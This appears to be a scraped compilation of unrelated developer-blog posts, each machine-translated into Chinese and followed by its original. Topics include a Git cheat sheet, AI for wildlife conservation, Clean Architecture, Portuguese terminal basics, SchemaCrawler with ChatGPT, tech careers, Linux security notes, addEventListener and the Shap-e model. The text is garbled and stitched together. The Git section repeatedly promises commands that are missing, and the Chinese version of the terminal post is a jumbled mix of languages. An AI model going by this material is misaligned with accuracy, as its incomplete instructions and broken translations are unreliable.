Initialization To initialize a new Git repository in the current directory, run the following command:

This creates a hidden .git directory in the current directory that tracks changes to your code.

Cloning

To clone an existing Git repository to your local machine, run the following command:

git clone <repository URL>

This creates a new directory on your computer with a copy of the repository.

Staging changes

Before you commit changes to your code, you need to stage them using the git add command. This tells Git which changes you want to include in your commit. To stage a file or directory, run the following command:

You can also stage all changes in the current directory by running:

Committing changes

To commit the changes in the staging area with a commit message, run the following command:
git commit -m "<commit message>"
The commit message should briefly describe the changes you made in the commit.

Checking status

To check the current status of your repository, run the following command:

This will show you which files have been modified, which files are staged for commit, and which files are untracked.

Viewing changes

To view the changes between the working directory and the staging area, run the following command:

To view the changes between the staging area and the last commit, run the following command:

Branching

Git allows you to create multiple branches of your code so that you can work on different features or fixes without affecting the main codebase. The default branch in Git is called master. To create a new branch with the specified name, run the following command:

To switch to the specified branch, run the following command:

git checkout <branch name>

You can also create and switch to a new branch in one command by running:

git checkout -b <branch name>

To merge the specified branch into the current branch, run the following command:

Pushing changes To push changes to a remote repository, run the following command:

git push <remote> <branch>

is the name of the remote repository, and is the name of the branch you want to push.

Pulling changes

To pull changes from a remote repository, run the following command:

git pull <remote> <branch>

is the name of the remote repository, and is the name of the branch you want to pull.

Viewing history

To view the commit history, run the following command:

This will show you a list of all the commits in the repository, along with the commit message, author, and date.

Advanced Git commands

Reverting changes
If you need to undo a commit, you can use the git revert command. This creates a new commit that undoes the changes made in the specified commit.

Resetting changes

If you want to undo a commit and remove it from the commit history, you can use the git reset command. This removes the specified commit and all subsequent commits from the commit history. There are three options for git reset: --soft, --mixed, and --hard. --soft only resets the commit history and leaves the changes in the staging area. --mixed resets the commit history and unstages the changes.

--hard resets the commit history, unstages the changes, and discards all changes made after the specified commit.

To reset the last commit using --soft, run the following command: git reset --soft HEAD~1 To reset the last commit using --mixed, run the following command: git reset --mixed HEAD~1 To reset the last commit using --hard, run the following command:

git reset --hard HEAD~1

Rebasing

If you want to apply your changes to a different branch, you can use the git rebase command. This command applies your changes on top of the specified branch. To rebase the current branch onto the specified branch, run the following command:

Stashing

If you want to save changes without committing them, you can use the git stash command. This saves the changes in a stack of temporary commits, allowing you to switch to a different branch or work on something else. To stash your changes, run the following command:

To apply your changes again, run the following command:

Cherry-picking If you want to apply a specific commit from one branch to another, you can use the git cherry-pick command. This command applies the specified commit on top of the current branch. To cherry-pick the specified commit, run the following command:

git cherry-pick <commit hash>

Git hooks

Git hooks are scripts that run automatically before or after specific Git commands, allowing you to customize the behavior of Git. Git comes with a set of built-in hooks, but you can also create your own custom hooks.
To create a custom Git hook, navigate to the .git/hooks directory in your Git repository and create a new file with the name of the hook you want to create (e.g., pre-commit, post-merge). The file should be executable and contain the script you want to run.

Git aliases

Git aliases are shortcuts for Git commands, allowing you to save time and type less. You can create your own custom aliases using the git config command. To create a new alias, run the following command: git config --global alias. ''

is the name of the alias you want to create, and is the Git command you want to alias.

Git workflows

Git workflows are strategies for using Git to manage code changes in a team. There are several popular Git workflows, including the centralized workflow, the feature branch workflow, and the Gitflow workflow. The centralized workflow is a simple workflow that involves a single main branch, with all changes made directly to that branch. The feature branch workflow involves creating a new branch for each feature or bug fix, and merging those branches back into the main branch when the changes are complete.

The Gitflow workflow is a more complex workflow that involves multiple branches, including a develop branch for ongoing development, a release branch for preparing releases, and feature branches for individual features.

Conclusion

In conclusion, Git is a powerful tool for version control and managing code changes. It allows developers to collaborate on projects, track changes, and revert to previous versions when necessary. While the basic Git commands are essential to know, the advanced Git commands discussed in this cheat sheet can help you be more efficient and effective when working with Git.

item.title: 野生动物保护中的人工智能：改变动物保护的未来 | AI in Wildlife Conservation: Transforming the Future of Animal Protection
item.description:
奥哈动物

发表于 7 月 22 日

人工智能（AI）正在给各个行业带来革命性的变化，野生动物保护也不例外。 近年来，人工智能驱动的解决方案已成为解决动物保护和保护工作中关键挑战的强大工具。 本文探讨了人工智能在保护濒危物种、监测野生动物种群以及促进人类与动物之间可持续共存方面的令人兴奋的方式。

用于物种识别的人工智能驱动图像识别

传统的野外物种鉴定方法既耗时又容易出错。 我们深入研究了如何部署基于人工智能的图像识别系统，从相机陷阱镜头、无人机图像，甚至公民科学家分享的照片中自动识别和跟踪野生动物物种。 该技术简化了数据分析，使研究人员和自然资源保护主义者能够有效监测物种种群和趋势。

栖息地保护的预测分析

人工智能驱动的预测分析提供了彻底改变栖息地保护和恢复工作的潜力。 通过分析大量环境数据，包括气候模式、土地利用变化和栖息地健康状况，人工智能算法可以预测对动物栖息地的潜在威胁，并提出积极的保护措施。 我们研究了人工智能驱动的预测成功指导保护工作、防止栖息地丧失并确保濒危物种生存的案例研究。

用于野生动物管理的智能项圈和跟踪设备

人工智能增强型智能项圈和跟踪设备为野生动物管理和了解动物行为开辟了新途径。 这些设备可以收集有关动物运动模式、进食习惯以及与环境相互作用的复杂数据。 我们探索人工智能算法如何处理和分析这些数据，为动物迁徙、栖息地偏好以及与人类活动的潜在冲突提供有价值的见解。

人工智能支持的反偷猎和野生动物犯罪预防

偷猎和非法野生动物贸易继续对许多物种构成重大威胁。 人工智能通过分析卫星图像、社交媒体和在线市场等各种来源的数据，在打击这些犯罪方面发挥着关键作用。 我们阐明了人工智能算法如何检测可疑活动、识别潜在的偷猎热点并协助执法机构遏制野生动物犯罪。 如果您是动物爱好者，请查看此网站。

结论

随着技术和人工智能的不断进步，它们与动物保护工作的结合为保护地球的生物多样性提供了前所未有的潜力。 技术与动物保护的结合代表了一种强大的伙伴关系，无疑将塑造野生动物保护的未来，并促进人类与动物王国之间的和谐。

原文:

ohanimal

Posted on Jul 22

Artificial Intelligence (AI) is revolutionizing various industries, and wildlife conservation is no exception. In recent years, AI-powered solutions have emerged as powerful tools to address critical challenges in animal protection and conservation efforts. This article explores the exciting ways AI is being employed to safeguard endangered species, monitor wildlife populations, and foster sustainable coexistence between humans and animals.

AI-Driven Image Recognition for Species Identification

Traditional methods of species identification in the field can be time-consuming and error-prone. We delve into how AI-based image recognition systems are being deployed to automatically identify and track wildlife species from camera trap footage, drone images, and even photographs shared by citizen scientists. This technology streamlines data analysis, empowering researchers and conservationists to efficiently monitor species populations and trends.

Predictive Analytics for Habitat Preservation

AI-powered predictive analytics offer the potential to revolutionize habitat preservation and restoration efforts. By analyzing vast amounts of environmental data, including climate patterns, land use changes, and habitat health, AI algorithms can forecast potential threats to animal habitats and suggest proactive conservation measures. We examine case studies where AI-driven predictions have successfully guided conservation efforts, preventing habitat loss and ensuring the survival of endangered species.

Smart Collars and Tracking Devices for Wildlife Management

AI-enhanced smart collars and tracking devices have opened new avenues for wildlife management and understanding animal behavior. These devices can gather intricate data on an animal's movement patterns, feeding habits, and interactions with their environment. We explore how AI algorithms process and analyze this data, providing valuable insights into animal migrations, habitat preferences, and potential conflicts with human activities.

AI-Powered Anti-Poaching and Wildlife Crime Prevention

Poaching and illegal wildlife trade continue to pose significant threats to many species. AI is playing a critical role in combating these crimes by analyzing data from various sources, such as satellite imagery, social media, and online marketplaces. We shed light on how AI algorithms can detect suspicious activities, identify potential poaching hotspots, and assist law enforcement agencies in their efforts to curb wildlife crimes. If you are a animal lover checkout this website.

Conclusion

As technology and AI continue to advance, their integration with animal conservation efforts offers unprecedented potential for safeguarding our planet's biodiversity. The combination of tech and animal conservation represents a powerful partnership that will undoubtedly shape the future of wildlife protection and promote harmony between humans and the animal kingdom.

Ahsan Mangal 👨🏻‍💻 - May 18

Coding Journal by Nikki - May 17

item.title: 干净的架构 | Clean Architecture
item.description:
伊格纳西·斯塔钦斯基

发表于 7 月 22 日

在 GitHub 上给 star ⭐️ - github.com/iuno-san/Clean-Architecture

清洁架构设计模式是构建可扩展、可维护和经过测试的应用程序的绝佳选择。 清洁架构基于分离应用程序不同层之间的依赖关系的原则，允许轻松修改和替换单个元素，而不会影响整个系统。

以下步骤可以帮助您使用干净架构模式构建 ASP.NET Core MVC 应用程序：

在 ASP.NET Core MVC 中，这将是控制器和视图层。
  • 这是包含业务操作的应用程序服务所在的位置。
  • 在 ASP.NET Core 中，通过选择“ASP.NET Core Web 应用程序”模板并指定“ MVC ”作为项目类型来创建一个新项目。

    确保您的项目正确组织以分隔不同的层并避免它们之间的强依赖性。 例如，您可以为每个层创建单独的文件夹。

    此处避免依赖于其他层。

  • 这些服务将使用领域层的实体。 确保应用程序层不依赖于表示层或基础设施层。
  • 控制器将使用应用程序服务来处理用户请求和处理数据。 尝试最小化控制器中的逻辑并将其移至应用程序层。
  • 您可以使用存储库模式将数据访问与应用程序的其余部分分开。

    • 确保正确配置层之间的依赖关系。 通常，表示层和应用程序层将依赖于领域层，而基础设施层将依赖于其他层。 避免对领域层中的表示层或基础设施层的依赖。

    处理代码的单元测试是清洁架构的关键。 您可以使用xUnit 、 NUnit或MSTest等单元测试工具来单独测试各个代码单元。

    在 ASP.NET Core 中配置依赖注入(DI)机制，以在层之间提供适当的服务实现。

    考虑添加监视和日志记录机制以轻松检测应用程序中的问题。 开发和维护：基本架构完成后，您可以通过添加新功能和改进现有功能来继续开发应用程序。

    请记住，清洁架构模式在一开始可能需要更多的努力，但从长远来看会提供许多好处，特别是当应用程序增长并变得更加复杂时。 通过正确组织的代码和隔离的层，维护应用程序和进行更改变得更加容易。

    如果你喜欢它，请在 GitHub 上关注我 - github.com/iuno-san

    一旦被暂停，iuno-san 将无法发表评论或发布帖子，直到其暂停被解除。

    一旦解除暂停，iuno-san 将能够再次发表评论和发布帖子。

    一旦取消发布，iuno-san 的所有帖子都将被隐藏，只有他们自己才能访问。

    如果 iuno-san 没有被暂停，他们仍然可以从仪表板重新发布帖子。

    笔记：

    感谢您保证 DEV 社区的安全。 您可以执行以下操作来标记 iuno-san：

    使 iuno-san 的所有帖子不那么明显

    举报其他不当行为

    取消 iuno-san 的标记将恢复其帖子的默认可见性。



    原文:

    Ignacy Starczynski

    Posted on Jul 22

    Give star ⭐️ on GitHub - github.com/iuno-san/Clean-Architecture

    The Clean Architecture design pattern is a great choice to build scalable, maintainable, and tested applications. Clean Architecture is based on the principle of separating dependencies between different layers of the application, which allows for easy modifications and replacement of individual elements without affecting the entire system.

    Below are the steps that can help you build ASP.NET Core MVC applications using the Clean Architecture pattern:

    🔥 Application layers

    • Presentation Layer: Responsible for handling user interaction and displaying data. In ASP.NET Core MVC, this would be the Controllers and Views layer.
    • Application Layer: Responsible for application logic and data processing. This is where the application services that contain business operations are located.
    • Domain Layer: Contains business logic and entities that represent application domain objects.
    • Infrastructure Layer: Responsible for technical aspects of the application, such as access to the database, external services, repository implementations, etc.

    In ASP.NET Core, create a new project by selecting the "ASP.NET Core Web Application" template and specifying "MVC" as the project type.

    🏋️‍♀️ Project organization

    Make sure your project is properly organized to separate different layers and avoid strong dependencies between them. For example, you can create separate folders for each layer.

    🌌 Implementation of layers

    • Domain layer: In this layer, define entities that represent the main objects in your domain. Avoid dependencies on other layers here.
    • Application layer: Here create application services that will contain the logic of business operations. These services will use entities from the domain layer. Make sure that the application layer has no dependencies on the presentation or infrastructure layer.
    • Presentation layer: This layer contains controllers and views. Controllers will use application services to handle user requests and process data. Try to minimize logic in controllers and move it to the application layer.
    • Infrastructure layer: here implement specific mechanisms for database access, external services or other technical aspects of the application. You can use the repository pattern to separate data access from the rest of the application.

    Make sure that the dependencies between layers are properly configured. Typically, the presentation layer and the application layer will have dependencies on the domain layer, and the infrastructure layer on the others. Avoid dependencies on the presentation or infrastructure layers in the domain layer.

    ⚙️ Testing

    Taking care of unit testing of code is key in Clean Architecture. You can use unit testing tools such as xUnit, NUnit or MSTest to test individual units of code in isolation.

    🤖 Configuration

    Configure Dependency Injection (DI) mechanisms in ASP.NET Core to provide appropriate service implementations between layers.

    🎥 Monitoring

    Consider adding monitoring and logging mechanisms to easily detect problems in the application. Development and maintenance: Once the basic architecture is complete, you can continue to develop the application by adding new features and improving existing ones.

    🍂 Summary

    Keep in mind that the Clean Architecture pattern may require more effort in the beginning, but provides many benefits in the long run, especially if the application grows and becomes more complex. With properly organized code and isolated layers, maintaining the application and making changes is much easier.

使用起来很简单，请注意以下事项。 可以使用 espaços 目录名称和 acentos você deve passar 或 entre aspas mkdir "diretório com espaço e acento" ，以快速使用 espaços 和 acentos para criar diretórios。

您可以在 Windows dir使用diretorio1 ls diretorio2也可以在命令目录中使用命令，也无法在 Linux 上验证相关信息。

林潘多阿特拉

所有这些命令都必须由终端开发人员负责编写脚本。

请注意观察并分散注意力。 我不担心，我们已经在终点站和从头开始清理干净了。

可以对 Windows 进行cls ，也可以对 Linux 进行clear 。 结论

您可以在终端上进行操作。

Em breve irei voltar com um novo post com mais comandos para você aprender ainda mais sobre como usar os terminais. 原文:

Se você está começando a programar ou não você já deve ter visto um prompt ou terminal. Aquela tela preta com vários códigos misteriosos.

Hoje vou desmistificar alguns comandos básicos do terminal para que esse códigos não sejam mais um mistério.

Diretórios

No terminal as pastas que você acessa são chamados de diretórios. E para ver o que tem no diretório que você está você pode usar o comando dir no Windows ou ls caso esteja usando Linux.

Terminal Windows

Terminal Linux

No diretório que estamos, temos um arquivo de texto text.txt e um diretório chamado pasta-1.

Cada terminal tem sua forma de exibir as coisas. No Windows ele exibe os diretórios com o <DIR> a esquerda do nome. Já no Linux os diretórios são exibidos com uma cor diferente no nome do diretório, nesse caso a cor azul.

Navegando nos diretórios

Bem já sabemos como ver o que temos dentro de um diretório, mas como fazer para entrar ou sair de um diretório?

Para isso temos o comando cd, change directory ou mudar diretório em português.

Esse comando nos permite voltar ao diretório anterior com cd .., onde ".." é um atalho para o diretório acima do que você está. Para mudar para outro diretório você pode passar o caminho completo ou o caminho relativo ao que você está. Lembrando que os caminho no Windows usam \ e no Linux usam /.

Terminal Windows

**Terminal Linux

Criando Diretórios

Agora vamos ver como criar um novo diretório. Para criar diretórios novos existe o comando mkdir, make directory ou criar diretório em português.

Para usa-lo é simples, apenas precisa passar o nome do diretório que deseja criar. Caso o nome do diretório tenho espaços e acentos você deve passar o nome entre aspas mkdir "diretório com espaço e acento", mas é melhor não usar espaços e acentos para criar diretórios.

Terminal Windows

Terminal Linux

Caso você queira criar uma árvore de diretórios mais rapidamente você pode separar os diretórios usando \ no Windows e no Linux você tem que passar a flag -p e separar os diretórios com /.

Terminal Windows

Terminal Linux

Eu criei o diretorio1 e dentro dele criei o diretorio2 e usei o comando dir no Windows e ls no Linux para verificar se foram criados corretamente.

Limpando a Tela

Bem depois de todos esses comandos seu terminal deve ter ficado cheio de códigos escritos nele.

Isso as vezes pode atrapalhar sua visão e te distrair. Mas não se preocupe, pois existe um comando para limpar a tela do seu terminal e deixar tudo clean de novo.

Esse comando o é cls para o Windows e clear para o Linux. Ao rodar esse comando sua tela do terminal será limpa.

Conclusão

Bem chegamos ao final desse post. Eu espero que eu tenha te ajudado a entender um pouco dos comandos do terminal.

Em breve irei voltar com um novo post com mais comandos para você aprender ainda mais sobre como usar os terminais. Até a próxima e não esqueça de dar um like e compartilhar com seus colegas.

苏阿莱·法塔希

您希望如何从 ChatGPT 获得帮助来回答此类问题？

  • 这个数据库是关于什么的？
  • 该架构是关于哪个主题的？

为此，您需要向 ChatGPT 描述您的架构。 输入 SchemaCrawler。 您可以将输出粘贴到 ChatGPT 中并提出诸如上述问题。

让我们开始吧。 按照SchemaCrawler 系列中的任何说明开始使用 SchemaCrawler。 一旦您获得了文本形式的架构，只需将其粘贴到 ChatGPT 中并提出您的问题即可！ 您会对所获得的帮助感到惊讶。

Sualeh Fatehi

Posted on Jul 22

How would you like to get help from ChatGPT to answer questions like these?

  • What is this database about?
  • Which topic is this schema about?
  • Can you write SQL for getting book names and author names?
  • Can you suggest comments for columns that do not have them?
  • Does this database have personal data?
  • Can you suggest indexes for this database?

In order to do this, you need to describe your schema to ChatGPT. Enter SchemaCrawler. SchemaCrawler generates easy-to-read text output with tables, columns, foreign keys, and indexes. You can paste the output into ChatGPT and ask questions such as the ones above.

Let's get started. Begin with SchemaCrawler by following any of the instructions in the series on SchemaCrawler. Once you have your schema in text form, simply paste it into ChatGPT and ask your questions! You will be surprised at the help you can get.

item.title: 为什么从事科技工作并不意味着成为软件工程师 | Why Working in Tech Does Not Mean Becoming a Software Engineer
item.description:
我读过无数次“从事技术工作”或“突破技术”与成为软件工程师或编码之间的关系。

作为一名前软件工程师，我承认软件工程是科技行业需求量最大的工作之一。 但这并不是唯一的一个。

本文将解释为什么从事技术工作并不意味着成为软件工程师。

科技是一个产业。 软件工程是一个角色。

科技包括数十个子领域，例如网络安全、数据、机器人、物联网（IoT）等。

软件工程是一个你可以在科技以外的任何领域担任的角色。 例如，您可以在酒店、医疗保健、石油和天然气领域担任软件工程师。

科技行业以快速变化和前沿而闻名。

这是一个每年都会创造新角色和新需求的行业。

与普遍的看法相反，您不必学习编码即可进入这个行业。

在大流行之前，巨大的推动力是鼓励人们（尤其是年轻人）学习如何编码。

告诉每个人他们应该学习如何编码就像告诉每个人他们应该成为一名医生一样。 如果你热衷于拯救人们的生命，那么这是很好的建议，但如果它与你的兴趣、技能和天赋不符，那就有害了。 随着科技公司的发展，他们需要聘请销售和营销团队将技术转化为收入。 当他们扩展到新的办公地点时，他们需要运营团队。 对于求职者来说，这意味着您不必成为软件工程师才能在科技公司找到工作，因为他们也雇用非技术人员。 正如第二点中提到的，你不必学习编码就可以在科技行业工作。

该行业具有技术和非技术角色。

即使您不具备编码等技术技能，但仍想在这个行业工作，有些职位的软技能更受重视。

我在文章《5 个非软件工程的高薪技术职业》中讨论了这一点。

科技公司需要软件工程之外的许多不同角色和技能来实现其目标。

举个例子，Google 在 Engineering&Technical Jobs 招聘网站中列出了以下职位：

  • 研究科学家。

  • 产品经理。

  • 用户体验专家。

  • 阅读软件工程师的 5 个替代职业选择，了解有关软件工程师可以选择的其他职业的更多信息。

    要点

    读完本文后，您就会知道为什么从事技术工作并不意味着成为软件工程师。 科技提供了许多角色，包括技术性和非技术性的。

    本文并不是要阻止您学习如何编码或成为一名软件工程师。 它向您展示了科技行业在软件工程之外提供了许多机会。

    进行研究、与人交谈并参加社交活动，以找出真正适合您的东西。

    直到下一次！

    🙋🏾 🙋🏾



原文:

I've read countless times how "working in tech" or "breaking in tech" is associated with becoming a software engineer or coding.

As a former software engineer, I acknowledge that software engineering is one of the tech industry's most high-in-demand jobs. But it's not the only one.

This article will explain why working in tech doesn't mean becoming a software engineer.

1. "Tech" is an industry

Tech is an industry. Software engineering is a role.

Tech comprises dozens of sub-fields, such as cyber security, data, robotics, Internet of Things (IoT), etc.

Software engineering is a role you can do in any field beyond tech. For example, you can work as a software engineer within the hospitality, healthcare, oil and gas space.

2. The tech industry is always evolving

The tech industry is known for being fast-changing and cutting-edge.

It's an industry that creates new roles and needs every year.

Contrary to popular belief, you don't have to learn coding to enter this industry.

3. There are other skills than coding

Before the pandemic, a huge push was to encourage people (especially young people) to learn how to code.

Telling everyone that they should learn how to code is akin to telling everyone that they should become a doctor. Great advice if youre passionate about saving peoples lives, but detrimental if its not aligned to your interests, skills, and raw talents.[Forbes]

[...]As the tech industry has matured, so has its workforce. As tech companies grow, they need to hire sales and marketing teams to transform technology into revenue. As they expand into new office locations, they need operations teams. For job seekers, this means that you dont have to be a software engineer in order to get a job at a tech company they are hiring non-tech workers too.[Business Money]

4. The tech industry has technical and non-technical roles

As mentioned in point number 2, you don't have to learn coding to work in tech.

The industry has technical and non-technical roles.

Even if you don't possess technical skills such as coding but still want to work in this industry, there are roles where soft skills are more valued.

I discussed this in my article 5 High-Paying Tech Careers That Are Not Software Engineering.

5. Tech companies are businesses

Tech companies are businesses that need many different roles and skill sets outside of software engineering to reach their goals.

To give you an example, Google lists the following jobs in the Engineering&Technical Jobs careers site:

  • Research Scientist.

  • Product Manager.

  • UX Specialist.

  • Developer Relations.

Read 5 Alternative Career Options For Software Engineers to learn more about the other careers available for software engineers.

Key Takeaways

After reading this article, you know why working in tech does not mean becoming a software engineer. Tech offers many roles, both technical and non-technical.

This article doesn't want to discourage you from learning how to code or becoming a software engineer. It shows you that the tech industry offers many opportunities outside of software engineering.

Do your research, talk to people, and attend networking events to find out what truly suits you.

P.S.: if you enjoyed this article, you'd benefit from reading my FREE weekly newsletter.

Until next time!

🙋🏾
item.author: maddy

原文:

sathishkumar balachandran

Posted on Jul 22

We are going to discuss on below Topics :

  1. Linux Security Problems
  2. Local Filesystem Security
  3. Local Authentication in Linux
  4. Remote Auhentication
  5. Network Security
  6. Security Tools & Distros
  7. Patching a Bash Vulnerability
  8. Security Monitoring & Logging

1. Linux Security Problems

Important Points to be remembered :

  1. Remove unnecessary packages.
  2. After any installation work on security aspects.
  3. Always remember : Accessibility , Software Installation Rights , Data permission and Recovery from Failure
  4. Password Protection Policy
  5. Integrity Checks : MD5 checksum - This will provide hash value which can be checked for any issues. To use this , there is also a package : sudo apt-get install gtkhash

How to check user as ROOT access ?

useradd Linux passwd Linux usermod -aG sudo testing su testing groups

sudo whoami

Once its populating 'root' at the last , this user as ROOT access.

NMAP :

  1. Scan a network.
  2. Gather information about a network.
  3. nmap.org/
  4. This can check what ports are running , status , etc.

2. Local Filesystem Security

  1. ls
  2. ls -FC ( directories will have '/' at the end , executables will have '@' at the last , etc )
  3. ls -l
  4. ls -a ( hidden files )
  5. ls -lh ( size )
  6. ls -d */
  7. ls -lah ( always use to practice this ! )

chmod :

u - user/owner g - group

o - Others

r - Read w - write

x - Execute

Adding the permission ,

chmod u+x file_name chmod g+x,o+x file_name chmod o-x file_name ( remove the permission ) chmod a+r file_name ( a - for all users , it will provide read permission for all users like u,g,o ) chmod a-r file_name

chmod o+x -R ( R for recessive for a directory )

we can also reference one file permission to other ,
chmod --reference=file1 file2

Now OCTAL representation ,

r = 4 w = 2

x = 1

Read and Execute Permission,

r-x = 4+0+1 = 5 rwx = 4+2+1 = 7

r-- = 4+0+0 = 4

chmod 754

Access Control List :

  1. ACL
  2. Check whether ACL is installed or NOT , check using any file : getfacl file_name

Here user3 won't have access to the directory. We can save the permission of a directory for future purpose,

getfacl -R /directory>permissions.acl

We can also restore the permission,

setfacl --restore=permission.cal

move command :

  1. mv file_name /directory ( files will be deleted in the old directory )
  2. Rename file and directory can be done with this.
  3. mv -V *.txt /directory ( like Verbose )
  4. mv -i file_name /directory ( it helps to notify if there is any same file_name in the target directory , it will give a pop up )
  5. mv -uv *.txt /target (TBD) Its like updating the file.
  6. mv -bv *.txt /target (TBD) it will create backup file
  7. mv -nv *.txt /target (TBD)

Notes :

  1. usermod -aG (TBD)
  2. what is the difference between useradd or adduser ? (TBD)
  3. passwd -d username (TBD)
  4. Add the user to the group , usermod -G group1 user1
  5. Add group , addgroup group1

MUHAMMAD JAMSHAID TAHIRI - Jul 22

Techsolutionstuff - Jul 22

item.title: 学习 JavaScript：“addEventListener” | Learning JavaScript: "addEventListener"
item.description:
梅格卡特

发表于 7 月 22 日

我叫梅根，已经在亚马逊工作两年了。 这份工作是一次积极的经历，因为我能够免费接受教育。 当我在工作中看到一个名为 ATA 的项目可以培训您成为软件工程师时，我第一次接触到软件工程。

我开始从事 SE 和其他科技职业的研究，并对这个领域产生了浓厚的兴趣。 我相信科技行业非常适合我！ 不幸的是，我未能通过考试而被该计划录取。 仍然坚定不移，我通过亚马逊职业选择计划研究了认证。 我偶然发现了熨斗学校并决定申请！

到目前为止，我很享受学习如何编码的经历。 有时这很具有挑战性，但当解决方案最终出现在我面前时，这是一种很有成就感的感觉。

到目前为止我学到的最有趣的事情是addEventListener 。 此方法允许在函数中调用的事件发生。 事件是用户或浏览器执行的操作，例如按视频播放或单击将您引导至另一个页面的链接。 有多种活动可供选择，让您的浏览器具有互动性和娱乐性！ 下面仅举几个例子：

  • 单击-按键
  • 模糊剪切
  • 鼠标悬停 - 复制
  • 键盘粘贴

让我们看一个例子：

 document.addEventListener("click", sayHello); function sayHello() { alert ("Hello!") }

在此示例中，事件是“click”，函数是 sayHello。 当通过事件调用该函数时，结果将为“Hello”。

这只是对addEventListener如何工作的简单解释。

一旦被暂停，megcartr 将无法发表评论或发布帖子，直到其暂停被解除。

一旦解除暂停，megcartr 将能够再次发表评论和发布帖子。

一旦取消发布，megcartr 的所有帖子都将被隐藏，只有他们自己才能访问。

如果 megcartr 没有被暂停，他们仍然可以从仪表板重新发布帖子。

感谢您保证 DEV 社区的安全。 您可以执行以下操作来标记 megcartr：

举报其他不当行为

原文:

megcartr

Posted on Jul 22

My name is Meghan and I have been working for Amazon for 2 years now. This job has been a positive experience as I have been able to pursue my education at no cost. I was first introduced to Software Engineering when I saw a post at work for a program that would train you to become a Software Engineer called ATA.

I began doing research in SE and other careers in Tech and became fascinated with the field. I believe a career in Tech would be a perfect fit for me! Unfortunately, I was not able to pass the exam in order to be accepted into the program. Still determined, I looked into certifications through the Amazon Career Choice Program. I came across Flatiron School and decided to apply!

I have enjoyed my experience learning how to code thus far. It has been challenging at times but when the solution finally comes through to me, it is such a rewarding feeling.

The most interesting thing that I have learned so far is addEventListener. This method allows for an event to happen that is called in a function. Events are actions made by the user or browser such as pressing play on a video or clicking a link which directs you to another page. There are so may events to choose from to make your browser interactive and entertaining! Below are just a few examples:

  • click - keydown
  • blur - cut
  • mouseover - copy
  • keyup - paste

addEventListener consists of 2 parameters: the event (defines the event name) and the function(responds to the event). Lets take a look at an example:

document.addEventListener("click", sayHello);

function sayHello() {
    alert ("Hello!")
}

In this example, the event is "click" and the function is sayHello. When the function is called through the event, the results would be "Hello".

This is just a simple explanation of how addEventListener works.

item.title: AI 3D 模型生成器：探索 Shape-e 模型 | AI 3D Model Generator: Exploring the Shap-e Model
item.description:
在 3D 建模和计算机图形学在从游戏到建筑等行业中变得越来越重要的时代，寻找简化复杂 3D 形状创建的方法似乎是一项艰巨的任务。 输入Shap-e ，这是一种 AI 模型，可将输入条件转换为详细的 3D 形状，使创作过程无缝且高效。

订阅或在Twitter上关注我以获取更多此类内容！

在本指南中，我们将带您浏览 Shap-e 模型，解释其独特的功能、如何使用它，甚至如何将其与AIModels.fyi上的类似模型进行比较。 那么，让我们踏上这段迷人的旅程吧。

关于Shape-e

这些函数构成了根据输入条件创建复杂 3D 形状的基础。 通过采用神经网络，Shap-e 可以理解输入条件与物体形状之间的关系。 这使其成为广泛应用的宝贵工具，包括 3D 建模、计算机图形学、虚拟现实，甚至科学模拟。 分别在创建者页面和模型详细信息页面上查找有关创建者和模型的更多信息。

无论是为视频游戏、动画和虚拟现实环境生成逼真和定制的 3D 对象，还是创建复杂的建筑设计，Shap-e 都开辟了一个充满创意可能性的世界。 它甚至允许科学模拟生成对象或环境的准确 3D 表示。

了解 Shape-e 的输入和输出

在深入研究如何使用 Shap-e 之前，了解它所需的输入和产生的输出至关重要。 了解这一点可以显着增强您的用户体验并帮助您充分利用模型。

注意：您可能还想查看我们关于Point-e的指南，这是来自同一创建者的文本转 3D 模型生成器。 我们还有AdaMPI 指南- 一种将图像转换为 3D 场景的模型。

输入

这些包括：

  • 提示：这是生成 3D 模型的文本提示，但如果提供图像，则会被忽略。

  • 为了获得最佳结果，建议从输入图像中删除背景。

  • 默认值为 1。

  • 默认值为“nerf”。

  • 默认值为 128。

  • 输出

    为了响应输入，Shap-e 提供与生成的 3D 模型相对应的 URI 数组。 模型输出结构的原始 JSON 架构如下：

     { "type": "array", "items": { "type": "string", "format": "uri" }, "title": "Output" }

    使用 Shape-e 的分步指南

    了解输入和输出后，是时候探索如何使用 Shap-e 了。 本节将提供使用此模型创建复杂 3D 形状的分步指南。

    如果您不喜欢编码，Shap-e 还提供了演示。 虽然目前 Shap-e 没有可用的演示，但您可以查看演示链接以了解未来的更新。 这是试验模型参数并接收即时反馈的好方法。 对于那些热衷于编码的人，以下步骤将指导您如何与 Shap-e 的复制 API 进行交互。

    第1步：安装客户端

    首先，使用以下命令安装 Node.js 客户端：

    第2步：设置API令牌

    接下来，通过将 API 令牌设置为环境变量来进行身份验证：

     export REPLICATE_API_TOKEN=r8_*************************************

    这是您的默认 API 令牌，应保密。

    第 3 步：运行模型

    然后，运行模型：

     import Replicate from "replicate"; const replicate = new Replicate({ auth: process.env.REPLICATE_API_TOKEN, }); const output = await replicate.run( "cjwbw/shap-e:5957069d5c509126a73c7cb68abcddbb985aeefa4d318e7c63ec1352ce6da68c", { input: { prompt: "..." } } );

    您还可以设置预测完成时要调用的 Webhook URL。 查看webhook 文档以获取有关设置的详细信息。

    在网站上，您还可以将 Shap-e 等模型与其他类似模型进行比较。 去做这个：

    1. 访问AIModels.fyi ：转到AIModels.fyi并导航到模型列表。

    2. 选择要比较的模型：选择 Shap-e 和您想要与之比较的任何其他模型。

    3. 比较：单击“比较”按钮可查看模型的并排比较。 这将提供对模型的功能、输入和输出以及性能的深入了解。

    此比较功能可以帮助您为您的特定用例选择最合适的型号。

    结论

    它对人工智能的使用不仅简化了 3D 建模过程，而且还开辟了创建复杂和可定制形状的潜力。 无论您是视频游戏开发人员还是设计新建筑的建筑师，Shap-e 都提供了一个强大的工具，可以提高您的创造力和生产力。 这无疑是一个值得在人工智能之旅中探索和尝试的模型。

    请记住， AIModels.fyi会不断更新新模型。 请继续关注有关其他令人印象深刻的人工智能模型的更多指南！

    订阅或在Twitter上关注我以获取更多此类内容！



原文:

In an era where 3D modeling and computer graphics are becoming increasingly vital in industries ranging from gaming to architecture, finding ways to streamline the creation of complex 3D shapes can feel like a herculean task. Enter Shap-e, an AI model that transforms input conditions into detailed 3D shapes, making the creative process both seamless and efficient.

Subscribe or follow me on Twitter for more content like this!

In this guide, we'll take you on a tour of the Shap-e model, explaining its unique capabilities, how to use it, and even how to compare it with similar models on AIModels.fyi. Shap-e offers promising features for designers, artists, developers, and anyone looking to explore the possibilities of AI-assisted 3D modeling. So, let's embark on this fascinating journey.

About Shap-e

